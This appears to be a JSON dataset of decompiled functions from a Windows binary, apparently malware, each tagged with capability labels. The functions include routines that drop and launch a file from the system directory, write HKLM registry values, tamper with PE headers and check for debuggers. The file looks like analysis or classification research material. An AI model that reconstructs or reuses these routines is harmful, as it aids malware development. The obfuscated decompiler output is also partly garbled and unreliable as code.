{
    "00401180": {
        "rules": [
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a",
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x0040125e) overlaps instruction at (ram,0x0040125a)\n// \n\nint32_t __cdecl fcn.00401180(uint arg_8h, int32_t arg_ch, uint *arg_10h, int32_t *arg_14h)\n\n{\n    char **ppcVar1;\n    uint16_t uVar2;\n    int32_t iVar3;\n    char *pcVar4;\n    uchar *puVar5;\n    uchar *extraout_ECX;\n    uchar *puVar6;\n    ushort uVar7;\n    uint16_t uVar8;\n    uchar *puVar9;\n    int32_t iVar10;\n    ushort in_SS;\n    bool bVar11;\n    bool bVar12;\n    ulong uVar13;\n    \n    uVar2 = fcn.00402810(0, arg_8h, arg_ch + 1U >> 1);\n    puVar9 = uVar2;\n    uVar13 = (*_sym.imp.dbghelp.dll_ImageNtHeader)(arg_8h);\n    puVar6 = extraout_ECX;\n    while( true ) {\n        iVar3 = uVar13;\n        uVar7 = uVar13 >> 0x20;\n        bVar12 = (CONCAT11((uVar13 >> 8) - puVar6, uVar13 + '\\x01') - 1U & 0x637b) == 0;\n        puVar5 = *(iVar3 + 0x58);\n        if ((bVar12) || (!bVar12)) {\n            bVar12 = puVar9 < puVar5;\n        }\n        else {\n            puVar5[0x6639da56] = puVar5[0x6639da56] ^ puVar6;\n            bVar12 = puVar9 < puVar5;\n        }\n        if (bVar12) {\n            bVar12 = false;\n            puVar9 = (puVar9 - puVar5 & 0xffffU) - 1;\n        }\n        else {\n            puVar6 = puVar5 & 0xffff;\n            bVar12 = puVar9 < puVar6;\n            puVar9 = puVar9 + -puVar6;\n        }\n        bVar11 = (POPCOUNT(puVar9 & 0xff) & 1U) == 0;\n        if ((bVar11) || (!bVar11)) goto code_r0x0040123d;\n        ppcVar1 = segment(in_SS, *0x10 + -0x14);\n        pcVar4 = *ppcVar1;\n        uVar13 = CONCAT44(0xb7bc9ea5, pcVar4);\n        uVar7 = 0x9ea5;\n        if (bVar12) break;\n        if (!bVar11) {\n            puVar5 = pcVar4;\n            uVar7 = 0x9ea5;\ncode_r0x0040123d:\n            pcVar4 = puVar5 >> 0x10;\n            uVar2 = puVar5 >> 0x10;\n            uVar8 = puVar9;\n            if (uVar8 < uVar2) {\n                puVar6 = puVar9;\n                if ((uVar8 != uVar2) && (uVar8 == uVar2)) {\ncode_r0x00401260:\n                    pcVar4 = pcVar4 & 0xffffff00 | *0x4bb148d3;\n                    puVar6 = puVar9 + 1;\n                    out(*puVar9, uVar7);\n                }\n                iVar10 = (puVar6 - pcVar4 & 0xffffU) - 1;\n            }\n            else {\n                iVar10 = puVar9 - pcVar4;\n            }\n            *arg_14h = iVar10 + arg_ch;\n            *arg_10h = *(iVar3 + 0x58);\n            return iVar3;\n        }\n    }\n    *pcVar4 = *pcVar4 + pcVar4;\n    goto code_r0x00401260;\n}\n",
        "token_count": 895
    },
    "00402810": {
        "rules": [
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498"
        ],
        "decompiled_code": "\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nulong __cdecl fcn.00402810(uint32_t arg_8h, uint16_t *arg_ch, int32_t arg_10h)\n\n{\n    uint16_t *in_EDX;\n    uchar *unaff_ESI;\n    uint16_t **unaff_EDI;\n    bool in_ZF;\n    bool in_OF;\n    uint unaff_retaddr;\n    uint var_4h;\n    \n    if ((!in_OF) && (in_OF)) {\n        *unaff_EDI = arg_ch;\n        return CONCAT44(unaff_retaddr, arg_ch);\n    }\n    if ((!in_ZF) && (in_ZF)) {\n        out(*unaff_ESI, in_EDX);\n    }\n    if (arg_10h != 0) {\n        do {\n            arg_8h = arg_8h + *arg_ch;\n            if (arg_8h >> 0x10 != 0) {\n                arg_8h = (arg_8h >> 0x10) + (arg_8h & 0xffff);\n            }\n            in_EDX = arg_ch + 1;\n            arg_10h = arg_10h + -1;\n            arg_ch = in_EDX;\n        } while (arg_10h != 0);\n    }\n    return CONCAT44(in_EDX, (arg_8h >> 0x10) + arg_8h);\n}\n",
        "token_count": 316
    },
    "004043a0": {
        "rules": [
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498"
        ],
        "decompiled_code": "\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __cdecl fcn.004043a0(uint lptstrFilename, uint s)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint var_24h;\n    uint var_1eh;\n    uint var_18h;\n    uint pBlock;\n    uint dwLen;\n    uint puLen;\n    int32_t lplpBuffer;\n    uint lpdwHandle;\n    \n    iVar1 = sub.VERSION.dll_GetFileVersionInfoSizeA();\n    if (iVar1 != 0) {\n        uVar2 = (*_sym.imp.KERNEL32.dll_GlobalAlloc)();\n        (*_sym.imp.KERNEL32.dll_GlobalLock)();\n        sub.VERSION.dll_GetFileVersionInfoA();\n        sub.VERSION.dll_VerQueryValueA();\n        (*_sym.imp.MSVCRT.dll_sprintf)\n                  (s, 0x42079c, *(lplpBuffer + 0x10) >> 0x10, *(lplpBuffer + 0x10), *(lplpBuffer + 0x14) >> 0x10, \n                   *(lplpBuffer + 0x14));\n        (*_sym.imp.KERNEL32.dll_GlobalUnlock)(uVar2);\n        (*_sym.imp.KERNEL32.dll_GlobalFree)(uVar2);\n    }\n    return 1;\n}\n",
        "token_count": 294
    },
    "004012c0": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nbool __cdecl fcn.004012c0(uint arg_8h)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.00401cb0(arg_8h, 1);\n    return iVar1 != 0;\n}\n",
        "token_count": 69
    },
    "00401cb0": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00401cb0(char *arg_8h, int32_t arg_ch)\n\n{\n    char cVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint *puVar5;\n    char *pcVar6;\n    uchar var_264h;\n    uint var_263h;\n    char var_160h;\n    uint var_15fh;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    int32_t var_48h;\n    int32_t var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    char *var_34h;\n    uint var_30h;\n    char *var_2ch;\n    char *var_28h;\n    char *var_24h;\n    char *var_20h;\n    char *var_1ch;\n    uint *var_18h;\n    uint *var_14h;\n    uint *var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    pcVar2 = _sym.imp.MSVCRT.dll_sprintf;\n    var_264h = 0;\n    puVar5 = &var_263h;\n    for (iVar3 = 0x40; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    *puVar5 = 0;\n    *(puVar5 + 2) = 0;\n    var_160h = '\\0';\n    puVar5 = &var_15fh;\n    for (iVar3 = 0x40; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    *puVar5 = 0;\n    *(puVar5 + 2) = 0;\n    var_ch = 1;\n    var_4h = 0;\n    var_8h = 1;\n    (*_sym.imp.MSVCRT.dll_sprintf)(&var_160h, 0x420348, arg_8h);\n    (*pcVar2)(&var_264h, str._aTWU, arg_8h);\n    pcVar2 = _sym.imp.SHLWAPI.dll_SHSetValueA;\n    var_20h = &var_160h;\n    var_18h = &var_ch;\n    var_14h = &var_4h;\n    var_10h = &var_8h;\n    uVar4 = 0xffffffff;\n    pcVar6 = &var_160h;\n    do {\n        if (uVar4 == 0) break;\n        uVar4 = uVar4 - 1;\n        cVar1 = *pcVar6;\n        pcVar6 = pcVar6 + 1;\n    } while (cVar1 != '\\0');\n    var_48h = ~uVar4 - 1;\n    uVar4 = 0xffffffff;\n    pcVar6 = arg_8h;\n    do {\n        if (uVar4 == 0) break;\n        uVar4 = uVar4 - 1;\n        cVar1 = *pcVar6;\n        pcVar6 = pcVar6 + 1;\n    } while (cVar1 != '\\0');\n    var_34h = str.2OJ_Z;\n    var_30h = 0x420394;\n    var_2ch = str.9WoJ;\n    var_28h = str._ZFyG;\n    var_24h = \" TTm0\";\n    var_5ch = 2;\n    var_58h = 1;\n    var_54h = 4;\n    var_50h = 4;\n    var_4ch = 4;\n    var_1ch = arg_8h;\n    var_44h = ~uVar4 - 1;\n    var_40h = 4;\n    var_3ch = 4;\n    var_38h = 4;\n    if ((arg_ch != 0) < 5) {\n        uVar4 = (arg_ch != 0) * 4;\n        do {\n            iVar3 = (*pcVar2)(0x80000002, &var_264h, *(&var_34h + uVar4), *(&var_5ch + uVar4), *(&var_20h + uVar4), \n                              *(&var_48h + uVar4));\n            if (iVar3 != 0) {\n                return 0;\n            }\n            uVar4 = uVar4 + 4;\n        } while (uVar4 < 0x14);\n    }\n    return 1;\n}\n",
        "token_count": 1089
    },
    "00402290": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\nuint32_t fcn.00402290(void)\n\n{\n    int32_t iVar1;\n    uint uStack12;\n    uint32_t uStack8;\n    uchar auStack4 [4];\n    \n    uStack12 = 4;\n    iVar1 = fcn.00403700(0x80000002, 0x4204c0, 0x42050c, auStack4, &uStack8, &uStack12);\n    if ((iVar1 == 0) || (5 < uStack8)) {\n        uStack8 = 0xffffffff;\n    }\n    return uStack8;\n}\n",
        "token_count": 133
    },
    "00403ab0": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00403b15) overlaps instruction at (ram,0x00403b14)\n// \n// WARNING: Removing unreachable block (ram,0x00403af0)\n\nuint fcn.00403ab0(void)\n\n{\n    uint8_t uVar1;\n    uint32_t uVar2;\n    int32_t unaff_ESI;\n    int32_t *piVar3;\n    uint8_t *unaff_EDI;\n    char *pcVar4;\n    uint16_t in_ES;\n    uint8_t in_AF;\n    bool bVar5;\n    char cVar6;\n    uint8_t in_TF;\n    uint8_t in_IF;\n    char cVar7;\n    uint8_t in_NT;\n    uint8_t in_AC;\n    uint8_t in_VIF;\n    uint8_t in_VIP;\n    uint8_t in_ID;\n    uint *puVar8;\n    uint lpVersionInformation;\n    uint32_t var_90h;\n    int32_t var_8ch;\n    \n    cVar7 = SBORROW4(&stack0xfffffffc, 0x94);\n    cVar6 = &lpVersionInformation < 0;\n    puVar8 = &lpVersionInformation;\n    lpVersionInformation = 0x94;\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetVersionExA)(puVar8);\n    if ((cVar7 == cVar6) && (cVar7 != cVar6)) {\n        puVar8 = puVar8 & 0xffff0000 | in_ES;\n        unaff_ESI = unaff_ESI + -1;\n        pcVar4 = unaff_EDI | &stack0xfffffffc;\n        unaff_EDI = pcVar4 + 1;\n        *pcVar4 = uVar2;\n        uVar2 = uVar2 + (uVar2 >> 8) * 'y';\n    }\n    if (var_90h == 5) {\n        return 1;\n    }\n    if ((var_90h < 5) || (var_90h >= 5)) {\n        bVar5 = var_90h == 6;\n    }\n    else {\n        uVar1 = uVar2;\n        cVar6 = uVar1 - *unaff_EDI;\n        piVar3 = unaff_ESI + -1;\n        func_0x10189a87((in_NT & 1) * 0x4000 | SBORROW1(uVar1, *unaff_EDI) * 0x800 | (in_IF & 1) * 0x200 |\n                        (in_TF & 1) * 0x100 | (cVar6 < '\\0') * 0x80 | (cVar6 == '\\0') * 0x40 | (in_AF & 1) * 0x10 |\n                        ((POPCOUNT(cVar6) & 1U) == 0) * 4 | uVar1 < *unaff_EDI | (in_ID & 1) * 0x200000 |\n                        (in_VIP & 1) * 0x100000 | (in_VIF & 1) * 0x80000 | (in_AC & 1) * 0x40000, puVar8);\n        *piVar3 = *piVar3 + 1;\n        bVar5 = *piVar3 == 0;\n    }\n    if ((bVar5) && (var_8ch == 0)) {\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 779
    },
    "004013c0": {
        "rules": [
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf",
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8"
        ],
        "decompiled_code": "\nuint fcn.004013c0(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    char **ppcVar6;\n    uint *puVar7;\n    char *pcVar8;\n    char *pcVar9;\n    char *pcVar10;\n    uint *puVar11;\n    uint uStack2112;\n    uint uStack2088;\n    char cStack2084;\n    uint uStack2083;\n    ushort uStack2079;\n    uchar uStack2077;\n    uchar uStack2064;\n    uint uStack2063;\n    uchar auStack1824 [12];\n    uchar auStack1812 [8];\n    uchar uStack1804;\n    uint uStack1803;\n    uchar auStack1564 [260];\n    char acStack1304 [20];\n    uchar auStack1284 [239];\n    char acStack1045 [21];\n    uchar uStack1024;\n    uint uStack1023;\n    \n    uStack2088 = 0;\n    cStack2084 = '\\0';\n    uStack2083 = 0;\n    uStack2079 = 0;\n    uStack2077 = 0;\n    uStack2064 = 0;\n    puVar7 = &uStack2063;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    *puVar7 = 0;\n    *(puVar7 + 2) = 0;\n    uStack1804 = 0;\n    puVar7 = &uStack1803;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    *puVar7 = 0;\n    *(puVar7 + 2) = 0;\n    uStack1024 = 0;\n    puVar7 = &uStack1023;\n    for (iVar2 = 0xff; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    *puVar7 = 0;\n    uStack2112 = 0x104;\n    *(puVar7 + 2) = 0;\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)(auStack1284);\n    (*_sym.imp.KERNEL32.dll_GetModuleFileNameA)(0, auStack1812, 0x104);\n    fcn.00401130(&uStack2112, 6);\n    (*_sym.imp.MSVCRT.dll_sprintf)(auStack1564, str.Qw_L, acStack1304, &uStack2112);\n    uStack2088 = 0x4207b8;\n    ppcVar6 = &stack0xfffff7d0;\n    iVar2 = 3;\n    do {\n        uVar3 = 0xffffffff;\n        pcVar9 = &cStack2084;\n        do {\n            if (uVar3 == 0) break;\n            uVar3 = uVar3 - 1;\n            cVar1 = *pcVar9;\n            pcVar9 = pcVar9 + 1;\n        } while (cVar1 != '\\0');\n        pcVar9 = *ppcVar6;\n        ppcVar6 = ppcVar6 + 1;\n        *(&uStack2088 + ~uVar3 + 3) = 10;\n        uVar3 = 0xffffffff;\n        do {\n            pcVar8 = pcVar9;\n            if (uVar3 == 0) break;\n            uVar3 = uVar3 - 1;\n            pcVar8 = pcVar9 + 1;\n            cVar1 = *pcVar9;\n            pcVar9 = pcVar8;\n        } while (cVar1 != '\\0');\n        uVar3 = ~uVar3;\n        iVar4 = -1;\n        pcVar9 = &cStack2084;\n        do {\n            pcVar10 = pcVar9;\n            if (iVar4 == 0) break;\n            iVar4 = iVar4 + -1;\n            pcVar10 = pcVar9 + 1;\n            cVar1 = *pcVar9;\n            pcVar9 = pcVar10;\n        } while (cVar1 != '\\0');\n        puVar7 = pcVar8 + -uVar3;\n        puVar11 = pcVar10 + -1;\n        for (uVar5 = uVar3 >> 2; uVar5 != 0; uVar5 = uVar5 - 1) {\n            *puVar11 = *puVar7;\n            puVar7 = puVar7 + 1;\n            puVar11 = puVar11 + 1;\n        }\n        iVar2 = iVar2 + -1;\n        for (uVar3 = uVar3 & 3; uVar3 != 0; uVar3 = uVar3 - 1) {\n            *puVar11 = *puVar7;\n            puVar7 = puVar7 + 1;\n            puVar11 = puVar11 + 1;\n        }\n    } while (iVar2 != 0);\n    (*_sym.imp.MSVCRT.dll_sprintf)(acStack1045 + 1, &cStack2084, auStack1824, auStack1824, acStack1304[0]);\n    pcVar9 = acStack1045;\n    uVar3 = 0xffffffff;\n    do {\n        pcVar9 = pcVar9 + 1;\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n    } while (*pcVar9 != '\\0');\n    acStack1045[~uVar3] = '\\n';\n    uVar3 = 0xffffffff;\n    pcVar9 = 0x4207d0;\n    do {\n        pcVar8 = pcVar9;\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n        pcVar8 = pcVar9 + 1;\n        cVar1 = *pcVar9;\n        pcVar9 = pcVar8;\n    } while (cVar1 != '\\0');\n    uVar3 = ~uVar3;\n    iVar2 = -1;\n    pcVar9 = acStack1045 + 1;\n    do {\n        pcVar10 = pcVar9;\n        if (iVar2 == 0) break;\n        iVar2 = iVar2 + -1;\n        pcVar10 = pcVar9 + 1;\n        cVar1 = *pcVar9;\n        pcVar9 = pcVar10;\n    } while (cVar1 != '\\0');\n    puVar7 = pcVar8 + -uVar3;\n    puVar11 = pcVar10 + -1;\n    for (uVar5 = uVar3 >> 2; uVar5 != 0; uVar5 = uVar5 - 1) {\n        *puVar11 = *puVar7;\n        puVar7 = puVar7 + 1;\n        puVar11 = puVar11 + 1;\n    }\n    for (uVar3 = uVar3 & 3; uVar3 != 0; uVar3 = uVar3 - 1) {\n        *puVar11 = *puVar7;\n        puVar7 = puVar7 + 1;\n        puVar11 = puVar11 + 1;\n    }\n    pcVar9 = acStack1045;\n    uVar3 = 0xffffffff;\n    do {\n        pcVar9 = pcVar9 + 1;\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n    } while (*pcVar9 != '\\0');\n    iVar2 = fcn.00404030(auStack1564, 0x4206fc, acStack1045 + 1, ~uVar3 - 1);\n    if (iVar2 == 0) {\n        return 0;\n    }\n    (*_sym.imp.KERNEL32.dll_WinExec)(auStack1564, 0);\n    return 1;\n}\n",
        "token_count": 1847
    },
    "00404770": {
        "rules": [
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf",
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf",
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8",
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004048f1) overlaps instruction at (ram,0x004048ef)\n// \n\nuint __cdecl fcn.00404770(uint *arg_8h)\n\n{\n    uchar uVar1;\n    uint16_t uVar2;\n    uint8_t uVar3;\n    int32_t *piVar4;\n    uint *puVar5;\n    int32_t iVar6;\n    uchar *puVar7;\n    uint32_t uVar8;\n    uint in_EDX;\n    uint16_t unaff_BX;\n    uint *puVar9;\n    uint *puVar10;\n    uchar *puVar11;\n    uint *unaff_EDI;\n    uint *puVar12;\n    bool bVar13;\n    float10 in_ST0;\n    float10 fVar14;\n    float10 extraout_ST0;\n    uint var_4h;\n    \n    puVar11 = &stack0xfffffffc;\n    if (*arg_8h != 0x5a4d) {\n        return 0;\n    }\n    bVar13 = CARRY4(arg_8h[0xf], arg_8h);\n    piVar4 = arg_8h[0xf] + arg_8h;\n    if ((bVar13 || piVar4 == NULL) || (!bVar13 && piVar4 != NULL)) {\n        bVar13 = *piVar4 == 0x4550;\n    }\n    else {\n        *unaff_EDI = *arg_8h;\n        unaff_BX = CONCAT11(0xdf, unaff_BX);\n        puVar11 = 0x81e181d0;\n        bVar13 = unaff_EDI == '\\x14';\n        piVar4 = &stack0xffffffec;\n        arg_8h = arg_8h + 1;\n    }\n    if (!bVar13) {\n        return 0;\n    }\n    if (piVar4[0x16] != 0) {\n        return 0;\n    }\n    uVar2 = in_EDX;\n    bVar13 = ((CONCAT11(piVar4 >> 8 & in_EDX >> 8, piVar4) * 2 | uVar2) ^ 0x6c00) != unaff_BX;\n    puVar5 = arg_8h;\n    if ((bVar13) && (!bVar13)) {\n        piVar4 = piVar4 & 0xffffff00 | *0x4bb148d3;\n        puVar5 = arg_8h + 1;\n        out(*arg_8h, uVar2);\n    }\n    uVar8 = puVar5[0xf];\n    bVar13 = puVar5[0xf] - 0x80 < 0;\n    if (uVar8 < 0x81) {\n        return 0;\n    }\n    if ((bVar13) || (!bVar13)) {\n        puVar5 = puVar5[0xf];\n    }\n    puVar9 = 0x40;\n    uVar8 = uVar8 < 0x80;\n    if (puVar5 < 0xc0) {\n        puVar9 = puVar5 + -0x20;\n    }\n    if ((SBORROW4(puVar5, 0xc0)) || (!SBORROW4(puVar5, 0xc0))) {\n        puVar5 = sub.MSVCRT.dll_void____cdecl_operator_new_unsigned_int_(puVar9);\n        puVar12 = puVar9;\n        fVar14 = extraout_ST0;\n    }\n    else {\n        puVar12 = puVar9 + 1;\n        uVar1 = in(uVar2);\n        *puVar9 = uVar1;\n        if (0xc0 < puVar5) {\n            puVar7 = piVar4 + (puVar5 < 0xc0) + uVar8 + 0x66768b58;\n            uVar3 = puVar7;\n            puVar5 = puVar7 & 0xffff0000 | CONCAT11(uVar3 / 0x5a, uVar3) & 0xffffff00 | uVar3 % 0x5a;\n            goto code_r0x004048f8;\n        }\n        fVar14 = in_ST0 / *(piVar4 + uVar8 + 0xbd0c20bc);\n        puVar5 = 0x430e857;\n        *0x430e857 = *0x430e857 + 'W';\n    }\n    *(puVar11 + -4) = puVar5;\n    if (puVar5 == NULL) {\n        return 0;\n    }\n    if ((-1 < puVar5) && (-1 >= puVar5)) {\n        *(puVar12 + 7) = fVar14;\n        puVar12 = puVar12 + 5;\n    }\n    puVar9 = NULL;\n    if (puVar12 != NULL) {\n        do {\n            iVar6 = (*_sym.imp.MSVCRT.dll_rand)();\n            puVar5 = *(puVar11 + -4);\n            puVar10 = puVar9 + 1;\n            *(puVar9 + puVar5) = iVar6 % 0xff;\n            puVar9 = puVar10;\n        } while (puVar10 < puVar12);\n    }\ncode_r0x004048f8:\n    puVar9 = puVar5;\n    puVar10 = *(puVar11 + 8) + 0x80;\n    for (uVar8 = puVar12 >> 2; uVar8 != 0; uVar8 = uVar8 - 1) {\n        *puVar10 = *puVar9;\n        puVar9 = puVar9 + 1;\n        puVar10 = puVar10 + 1;\n    }\n    for (uVar8 = puVar12 & 3; uVar8 != 0; uVar8 = uVar8 - 1) {\n        *puVar10 = *puVar9;\n        puVar9 = puVar9 + 1;\n        puVar10 = puVar10 + 1;\n    }\n    sub.MSVCRT.dll_void___cdecl_operator_delete_void__(puVar5);\n    return 1;\n}\n",
        "token_count": 1369
    },
    "00401630": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00401660)\n// WARNING: Removing unreachable block (ram,0x0040166c)\n\nbool __cdecl fcn.00401630(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    code *pcVar1;\n    uint arg_ch_00;\n    uint arg_ch_01;\n    uint arg_ch_02;\n    int32_t iVar2;\n    uint *puVar3;\n    uint var_314h;\n    uint var_210h;\n    uchar lpBuffer;\n    uint var_10bh;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    lpBuffer = 0;\n    puVar3 = &var_10bh;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    *puVar3 = 0;\n    var_8h = 0;\n    *(puVar3 + 2) = 0;\n    fcn.004010d0();\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)(&lpBuffer, 0x104);\n    var_4h = 0;\n    do {\n        arg_ch_00 = fcn.00404370();\n        arg_ch_01 = fcn.00404370();\n        arg_ch_02 = fcn.00404370();\n        fcn.00401130(arg_10h, arg_ch_00);\n        fcn.00401130(arg_8h, arg_ch_01);\n        fcn.00401130(arg_ch, arg_ch_02);\n        pcVar1 = _sym.imp.MSVCRT.dll_sprintf;\n        (*_sym.imp.MSVCRT.dll_sprintf)(&var_314h, 0x4202e0, &lpBuffer, arg_10h);\n        iVar2 = fcn.004028f0(&var_314h);\n        if (iVar2 != 0) {\n            (*pcVar1)(&var_210h, str.FIoU, &lpBuffer, arg_8h);\n            iVar2 = fcn.004028f0(&var_210h);\n            if (iVar2 != 0) {\n                (*pcVar1)(&var_210h, str.FIoU, &lpBuffer, arg_ch);\n                iVar2 = fcn.004028f0(&var_210h);\n                if (iVar2 != 0) {\n                    iVar2 = 1;\n                    break;\n                }\n            }\n        }\n        var_4h = var_4h + 1;\n        iVar2 = var_8h;\n    } while (var_4h < 3);\n    fcn.00401130(arg_14h, 4);\n    return iVar2 != 0;\n}\n",
        "token_count": 640
    },
    "00401860": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00401916) overlaps instruction at (ram,0x00401914)\n// \n// WARNING: Removing unreachable block (ram,0x00401916)\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nvoid __cdecl fcn.00401860(uint32_t arg_8h, int32_t arg_ch, int32_t arg_10h, int32_t arg_14h, int32_t arg_18h)\n\n{\n    uint8_t uVar1;\n    uint8_t uVar2;\n    uint16_t uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    bool bVar6;\n    uint var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint var_1h;\n    \n    var_8h = 0;\n    if (0 < arg_14h) {\n        var_ch = 1;\n        iVar4 = arg_14h * 2;\n        do {\n            uVar1 = *(var_8h + arg_10h);\n            uVar2 = *(var_ch % arg_ch + arg_8h);\n            uVar3 = iVar4 & 0xff00 | uVar2;\n            if (var_ch / arg_ch >> 8 < var_ch % arg_ch + 0x15U) {\n                uVar3 = iVar4 & 0xff00 | uVar2;\n            }\n            iVar4 = var_ch + -1;\n            iVar5 = iVar4 % arg_ch;\n            uVar2 = *(iVar5 + arg_8h);\n            bVar6 = -1 < (iVar5 - 1U & uVar3);\n            if ((bVar6) && (!bVar6)) {\n                var_ch = var_ch + -1;\n                *(arg_8h | &var_1h + 1U) = iVar4 / arg_ch;\n            }\n            var_10h._0_1_ = arg_14h * 2;\n            *(arg_18h + -1 + var_ch) = var_10h ^ uVar1 ^ uVar2;\n            *(var_ch + arg_18h) = var_10h ^ uVar3;\n            var_8h = var_8h + 1;\n            var_ch = var_ch + 2;\n            iVar4 = arg_14h;\n        } while (var_8h < arg_14h);\n    }\n    return;\n}\n",
        "token_count": 567
    },
    "00402010": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint fcn.00402010(void)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    \n    iVar2 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(0x4203c0);\n    pcVar1 = _sym.imp.KERNEL32.dll_GetProcAddress;\n    if (iVar2 == 0) {\n        return 0;\n    }\n    *0x4207e8 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar2, str.C_uX);\n    *0x4207ec = (*pcVar1)(iVar2, str..UAa_);\n    *0x4207f0 = (*pcVar1)(iVar2, str._T__);\n    if (((*0x4207e8 != 0) && (*0x4207ec != 0)) && (*0x4207f0 != 0)) {\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 202
    },
    "00404630": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00404670)\n\nuint __cdecl fcn.00404630(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uchar lpBuffer;\n    uint var_20fh;\n    uchar s;\n    uint var_10bh;\n    uint var_8h;\n    uint var_4h;\n    \n    lpBuffer = 0;\n    puVar2 = &var_20fh;\n    for (iVar1 = 0x40; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    *puVar2 = 0;\n    *(puVar2 + 2) = 0;\n    s = 0;\n    puVar2 = &var_10bh;\n    for (iVar1 = 0x40; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    *puVar2 = 0;\n    *(puVar2 + 2) = 0;\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)();\n    (*_sym.imp.MSVCRT.dll_sprintf)(&s, 0x4202e0, &lpBuffer, arg_8h);\n    fcn.00402780(&var_4h, &var_8h);\n    fcn.00404770(var_4h);\n    iVar1 = fcn.00404030(&s, 0x420300, var_4h, var_8h);\n    if (iVar1 == 0) {\n        return 0;\n    }\n    fcn.00403b40(&s, 0xffffffff);\n    return 1;\n}\n",
        "token_count": 408
    },
    "null": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
